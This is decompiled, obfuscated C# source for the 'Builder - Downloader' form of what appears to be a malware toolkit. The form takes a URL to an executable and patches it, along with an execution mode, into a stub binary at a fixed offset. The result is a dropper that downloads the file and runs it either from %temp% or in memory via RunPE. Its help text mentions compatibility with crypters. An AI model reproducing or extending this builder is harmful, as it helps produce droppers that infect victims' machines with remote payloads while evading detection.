﻿using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fBuilderDownloader : Form
{
    private IContainer icontainer_0;
    private Label label_0;
    private TextBox textBox_0;
    private PictureBox pictureBox_0;
    private PictureBox pictureBox_1;
    private PictureBox pictureBox_2;
    private VisualButton visualButton_0;
    private RadioButton radioButton_0;
    private RadioButton radioButton_1;

    public fBuilderDownloader()
    {
        base.Closing += new CancelEventHandler(this.fBuilderDownloader_Closing);
        this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fBuilderDownloader_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_1(new Label());
        this.vmethod_3(new TextBox());
        this.vmethod_11(new VisualButton());
        this.vmethod_13(new RadioButton());
        this.vmethod_15(new RadioButton());
        this.vmethod_9(new PictureBox());
        this.vmethod_7(new PictureBox());
        this.vmethod_5(new PictureBox());
        ((ISupportInitialize) this.vmethod_8()).BeginInit();
        ((ISupportInitialize) this.vmethod_6()).BeginInit();
        ((ISupportInitialize) this.vmethod_4()).BeginInit();
        base.SuspendLayout();
        this.vmethod_0().AutoSize = true;
        this.vmethod_0().BackColor = Color.Transparent;
        this.vmethod_0().FlatStyle = FlatStyle.Flat;
        this.vmethod_0().Location = new Point(10, 0x15);
        this.vmethod_0().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_0().Name = "lblURL";
        this.vmethod_0().Size = new Size(0x20, 13);
        this.vmethod_0().TabIndex = 0x29;
        this.vmethod_0().Text = "URL:";
        this.vmethod_0().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_2().Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_2().ForeColor = Color.Gray;
        this.vmethod_2().Location = new Point(0x2c, 0x12);
        this.vmethod_2().Margin = new Padding(1);
        this.vmethod_2().MaxLength = 0xff;
        this.vmethod_2().Name = "txtURL";
        this.vmethod_2().Size = new Size(0x1b4, 20);
        this.vmethod_2().TabIndex = 2;
        this.vmethod_2().Text = "http://site.com/file.exe";
        this.vmethod_10().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_10().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_10().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_10().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_10().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_10().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_10().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_10().Border.HoverVisible = true;
        this.vmethod_10().Border.Rounding = 6;
        this.vmethod_10().Border.Thickness = 1;
        this.vmethod_10().Border.Type = ShapeTypes.Rounded;
        this.vmethod_10().Border.Visible = true;
        this.vmethod_10().DialogResult = DialogResult.None;
        this.vmethod_10().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_10().Image = null;
        this.vmethod_10().Location = new Point(2, 0x61);
        this.vmethod_10().MouseState = MouseStates.Normal;
        this.vmethod_10().Name = "btnBuild";
        this.vmethod_10().Size = new Size(0x58, 0x1a);
        this.vmethod_10().TabIndex = 3;
        this.vmethod_10().Text = "Build";
        this.vmethod_10().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_10().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_10().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_10().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_10().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_10().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_10().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_10().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_12().AutoSize = true;
        this.vmethod_12().Checked = true;
        this.vmethod_12().Location = new Point(0x2c, 50);
        this.vmethod_12().Name = "rbDisk";
        this.vmethod_12().Size = new Size(90, 0x11);
        this.vmethod_12().TabIndex = 0;
        this.vmethod_12().TabStop = true;
        this.vmethod_12().Text = "Run from disk";
        this.vmethod_12().UseVisualStyleBackColor = true;
        this.vmethod_14().AutoSize = true;
        this.vmethod_14().Location = new Point(0xba, 50);
        this.vmethod_14().Name = "rbMem";
        this.vmethod_14().Size = new Size(0x72, 0x11);
        this.vmethod_14().TabIndex = 1;
        this.vmethod_14().Text = "Execute in memory";
        this.vmethod_14().UseVisualStyleBackColor = true;
        this.vmethod_8().Image = Class131.smethod_24();
        this.vmethod_8().Location = new Point(0x12d, 0x34);
        this.vmethod_8().Margin = new Padding(2);
        this.vmethod_8().Name = "pbMem";
        this.vmethod_8().Size = new Size(15, 15);
        this.vmethod_8().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_8().TabIndex = 0x2f;
        this.vmethod_8().TabStop = false;
        this.vmethod_6().Image = Class131.smethod_24();
        this.vmethod_6().Location = new Point(0x86, 0x34);
        this.vmethod_6().Margin = new Padding(2);
        this.vmethod_6().Name = "pbDisk";
        this.vmethod_6().Size = new Size(15, 15);
        this.vmethod_6().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_6().TabIndex = 0x2e;
        this.vmethod_6().TabStop = false;
        this.vmethod_4().Image = Class131.smethod_24();
        this.vmethod_4().Location = new Point(0x1e3, 0x15);
        this.vmethod_4().Margin = new Padding(2);
        this.vmethod_4().Name = "pbURL";
        this.vmethod_4().Size = new Size(15, 15);
        this.vmethod_4().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_4().TabIndex = 0x2b;
        this.vmethod_4().TabStop = false;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        this.BackColor = SystemColors.AppWorkspace;
        base.ClientSize = new Size(0x217, 0x7e);
        base.Controls.Add(this.vmethod_14());
        base.Controls.Add(this.vmethod_12());
        base.Controls.Add(this.vmethod_10());
        base.Controls.Add(this.vmethod_8());
        base.Controls.Add(this.vmethod_6());
        base.Controls.Add(this.vmethod_4());
        base.Controls.Add(this.vmethod_2());
        base.Controls.Add(this.vmethod_0());
        this.DoubleBuffered = true;
        base.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        base.MaximizeBox = false;
        base.MinimizeBox = false;
        base.Name = "fBuilderDownloader";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.StartPosition = FormStartPosition.CenterParent;
        this.Text = "Builder - Downloader";
        ((ISupportInitialize) this.vmethod_8()).EndInit();
        ((ISupportInitialize) this.vmethod_6()).EndInit();
        ((ISupportInitialize) this.vmethod_4()).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }

    public void method_0()
    {
        base.Opacity = 100.0;
    }

    private void method_1(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_2().Text, "http://site.com/file.exe", true) == 0)
        {
            this.vmethod_2().Text = string.Empty;
            this.vmethod_2().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_2().Font, FontStyle.Regular);
            this.vmethod_2().Font = font;
        }
    }

    private void method_2(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_2().Text, string.Empty, true) == 0)
        {
            this.vmethod_2().Text = "http://site.com/file.exe";
            this.vmethod_2().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_2().Font, FontStyle.Italic);
            this.vmethod_2().Font = font;
        }
    }

    private void method_3(object sender, EventArgs e)
    {
        Interaction.MsgBox("Enter a direct link to your exe.\r\n\r\nNOTE: You may use http and https protocols given that the direct link triggers a download.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_4(object sender, EventArgs e)
    {
        Interaction.MsgBox("The downloaded exe will be saved to Temp directory (%temp%) with a random filename and then executed.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_5(object sender, EventArgs e)
    {
        Interaction.MsgBox("The downloaded exe will be executed in memory using classic RunPE method.\r\n\r\nNOTE: This option may not be compatible with all Crypters. \r\nMake sure to test it!", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_6(object sender, EventArgs e)
    {
        if ((this.vmethod_2().TextLength < 3) | (Operators.CompareString(this.vmethod_2().Text, "http://site.com/file.exe", true) == 0))
        {
            Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Exclamation, Application.ProductName);
            this.vmethod_2().Select();
            this.vmethod_2().Focus();
        }
        else
        {
            byte[] destinationArray = Class131.smethod_12();
            byte[] bytes = Encoding.UTF8.GetBytes(Class136.smethod_40(Conversions.ToString(Operators.ConcatenateObject(this.vmethod_2().Text + "|", Interaction.IIf(this.vmethod_14().Checked, "1", "0")))));
            byte[] buffer3 = new byte[0x400];
            Array.Copy(bytes, 0, buffer3, 0, bytes.Length);
            Array.Copy(buffer3, 0, destinationArray, 0x31d20, buffer3.Length);
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "Executable |*.exe";
            if (dialog.ShowDialog() != DialogResult.OK)
            {
                Interaction.MsgBox("Operation cancelled!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                Class136.Class142 class2 = new Class136.Class142();
                class2.string_0 = dialog.FileName;
                class2.byte_0 = destinationArray;
                class2.bool_0 = false;
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                Interaction.MsgBox("Downloader saved to: " + dialog.FileName, MsgBoxStyle.Information, Application.ProductName);
            }
        }
    }

    internal virtual Label vmethod_0()
    {
        return this.label_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(Label label_1)
    {
        this.label_0 = label_1;
    }

    internal virtual VisualButton vmethod_10()
    {
        return this.visualButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(VisualButton visualButton_1)
    {
        EventHandler handler = new EventHandler(this.method_6);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_1;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual RadioButton vmethod_12()
    {
        return this.radioButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(RadioButton radioButton_2)
    {
        this.radioButton_0 = radioButton_2;
    }

    internal virtual RadioButton vmethod_14()
    {
        return this.radioButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(RadioButton radioButton_2)
    {
        this.radioButton_1 = radioButton_2;
    }

    internal virtual TextBox vmethod_2()
    {
        return this.textBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(TextBox textBox_1)
    {
        EventHandler handler = new EventHandler(this.method_1);
        EventHandler handler2 = new EventHandler(this.method_2);
        TextBox box = this.textBox_0;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
        }
        this.textBox_0 = textBox_1;
        box = this.textBox_0;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
        }
    }

    internal virtual PictureBox vmethod_4()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(PictureBox pictureBox_3)
    {
        EventHandler handler = new EventHandler(this.method_3);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_0 = pictureBox_3;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_6()
    {
        return this.pictureBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(PictureBox pictureBox_3)
    {
        EventHandler handler = new EventHandler(this.method_4);
        PictureBox box = this.pictureBox_1;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_1 = pictureBox_3;
        box = this.pictureBox_1;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_8()
    {
        return this.pictureBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(PictureBox pictureBox_3)
    {
        EventHandler handler = new EventHandler(this.method_5);
        PictureBox box = this.pictureBox_2;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_2 = pictureBox_3;
        box = this.pictureBox_2;
        if (box != null)
        {
            box.Click += handler;
        }
    }
}

